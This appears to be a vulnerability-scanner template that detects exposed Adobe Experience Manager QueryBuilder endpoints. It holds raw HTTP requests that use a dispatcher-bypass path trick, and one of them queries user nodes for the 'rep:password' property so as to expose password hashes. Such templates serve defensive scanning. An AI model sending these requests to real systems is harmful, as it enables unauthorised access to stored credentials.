id: aem-querybuilder-exposure-bypass

info:
  name: AEM QueryBuilder JSON Exposure
  author: tess,assetnote
  severity: critical
  description: |
    Detects exposed Adobe Experience Manager QueryBuilder endpoint that may reveal sensitive information.
    Manual testing is required to exploit the issue further.
  reference:
    - https://experienceleague.adobe.com/docs/experience-manager-65/developing/platform/query-builder/querybuilder-api.html
    - https://slcyber.io/assetnote-security-research-center/finding-critical-bugs-in-adobe-experience-manager/
    - https://github.com/assetnote/hopgoblin
  tags: aem,adobe,exposure,querybuilder

http:
  - raw:
      - |
        GET /bin/querybuilder.json;x='x/graphql/execute/json/x' HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /bin/querybuilder.json;x='x/graphql/execute/json/x'?path=%2Fhome%2Fusers&type=rep%3AUser&p.hits=selective&p.properties=rep%3Apassword&p.limit=3 HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /bin/querybuilder.feed;x='x/graphql/execute/json/x' HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "application/json"
        part: header

      - type: word
        words:
          - '{"success":true,"results":0,"total":0,"more":false,"offset":0,"hits":[]}'
          - '"rep:password"'
